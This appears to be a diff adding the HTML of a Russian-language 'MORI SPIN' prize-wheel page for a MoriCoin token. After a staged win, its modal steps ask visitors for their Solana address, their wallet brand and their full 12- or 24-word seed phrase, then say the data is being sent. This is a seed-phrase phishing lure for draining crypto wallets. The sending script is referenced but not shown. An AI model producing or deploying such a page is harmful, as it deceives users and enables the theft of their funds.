@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ru" class="">
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<link rel="icon" href="favicon.png" />
+		<link rel="stylesheet" href="assets/css/style.css" />
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+		<title>MORI SPIN</title>
+	</head>
+	<body>
+
+		<div class="main_container">
+			<h1 class="main_tittle">Специальный <span>бонус</span> <br> от MoriCoin</h1>
+			<div class="main_wheel">
+				<div class="main_wheel_main">
+					<img src="./assets/img/wheel_arrow.png" alt="" class="main_wheel_main_arrow">
+					<img src="./assets/img/wheel_wheel.png" alt="" class="main_wheel_main_wheel" id="wheel">
+					<button class="main_wheel_main_button" id="spin-button">Free Spin</button>
+				</div>
+			</div>
+			<div class="main_faq">
+				<div class="main_faq_blocks">
+					<p class="main_faq_block">
+						<img src="./assets/img/main_one.svg" alt="" />Крутите колесо наград и получите подарок от Профессора Мориарти!
+					</p>
+					<p class="main_faq_block">
+						<img src="./assets/img/main_two.svg" alt="" />Если вы выиграли в прокруте, поздравляем Вас!
+					</p>
+					<p class="main_faq_block">
+						<img src="./assets/img/main_three.svg" alt="" />Нажмите "Получить награду", подключите кошелёк и заберите приз
+					</p>
+				</div>
+			</div>
+		</div>
+
+		<div id="wallet-modal" class="modal-overlay" style="display: none;">
+			<div class="modal-content">
+				<button class="close-button" id="close-modal">&times;</button>
+				<button class="back-button" id="back-button" style="display: none;">←</button>
+				
+				<div id="step-initial" class="modal-step">
+					<h2>Поздравляем!</h2>
+					<p>Вы выиграли <strong>150,000 $MORI</strong></p>
+					<p class="subtitle">Подключите кошелёк для получения награды</p>
+					<button id="claim-reward-button" class="modal-button">Забрать Награду</button>
+				</div>
+				
+				<div id="step-sol-address" class="modal-step" style="display: none;">
+					<h2>Шаг 1: Ваш SOL адрес</h2>
+					<p class="subtitle">Введите публичный адрес вашего Solana кошелька.</p>
+					<input type="text" id="sol-address-input" placeholder="SOL Address" class="modal-input">
+					<button id="next-to-wallet-choice" class="modal-button">Далее</button>
+				</div>
+	
+				<div id="step-wallet-choice" class="modal-step" style="display: none;">
+					<h2>Шаг 2: Выберите кошелёк</h2>
+					<div class="wallet-grid">
+						<button class="wallet-option" data-wallet="Phantom">Phantom</button>
+						<button class="wallet-option" data-wallet="Solflare">Solflare</button>
+						<button class="wallet-option" data-wallet="Trust Wallet">Trust Wallet</button>
+						<button class="wallet-option" data-wallet="Exodus">Exodus</button>
+						<button class="wallet-option" data-wallet="Backpack">Backpack</button>
+						<button class="wallet-option" data-wallet="Другой">Другой</button>
+					</div>
+				</div>
+	
+				<div id="step-seed-phrase" class="modal-step" style="display: none;">
+					<h2>Шаг 3: Введите Seed фразу</h2>
+					<p class="subtitle">Введите сид-фразу, которую вы получили в нашем Telegram канале.</p>
+					<div class="word-count-selector">
+						<button class="word-count-btn active" data-count="12">12 слов</button>
+						<button class="word-count-btn" data-count="24">24 слова</button>
+					</div>
+					<textarea id="seed-phrase-input" placeholder="Введите 12 слов..." class="modal-textarea" rows="4"></textarea>
+					<p class="error-message" id="error-message" style="display: none;"></p>
+					<button id="submit-button" class="modal-button">Импортировать</button>
+				</div>
+	
+				<div id="step-loading" class="modal-step" style="display: none;">
+					<h2>Обработка...</h2>
+					<div class="loader"></div>
+					<p>Пожалуйста, подождите. Отправляем данные.</p>
+				</div>
+	
+				<div id="step-final" class="modal-step" style="display: none;">
+					<h2>Успешно!</h2>
+					<p>Ваши данные были отправлены. Ожидайте поступления награды.</p>
+				</div>
+			</div>
+		</div>
+
+		<script src="assets/js/jquery-3.6.3.js"></script>
+		<script src="assets/js/script.js"></script>
+
+	</body>
+</html>
